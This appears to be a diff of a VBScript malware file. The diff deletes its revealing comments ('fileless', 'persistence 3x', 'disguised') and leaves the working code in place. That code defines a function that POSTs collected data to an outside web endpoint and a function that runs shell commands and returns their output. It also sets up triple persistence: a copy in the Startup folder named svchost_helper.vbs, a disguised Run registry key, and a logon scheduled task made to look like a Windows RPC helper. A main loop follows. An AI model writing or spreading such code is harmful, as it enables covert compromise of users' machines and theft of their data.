@@ -1,4 +1,4 @@
-' === PHANTOM CORE - 100% FILELESS ===
+
 Function zExfil(zdata,zname)
     Set xhr = CreateObject("MSXML2.XMLHTTP")
     xhr.Open "POST", "https://httpbin.org/post", False  
@@ -24,21 +24,19 @@ Function zCmdShell(zcmd)
     zCmdShell = exe.StdOut.ReadAll()
 End Function
 
-' === PERSISTANCE 3x (Run + Startup + Task Scheduler) ===
+
 Sub zPersist()
     Set fso = CreateObject("Scripting.FileSystemObject")
     startup = fso.GetSpecialFolder(7) & "\svchost_helper.vbs"
     fso.CopyFile WScript.ScriptFullName, startup, True
     
-    ' Registry (déguisé)
     Set sh = CreateObject("WScript.Shell")
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\RpcSsHelper", startup
     
-    ' Task Scheduler
     sh.Run "schtasks /create /tn ""WindowsRpcHelper"" /tr """ & startup & """ /sc onlogon /rl limited /f", 0, True
 End Sub
 
-' === MAIN LOOP ===
+
 zPersist()
 Do
    
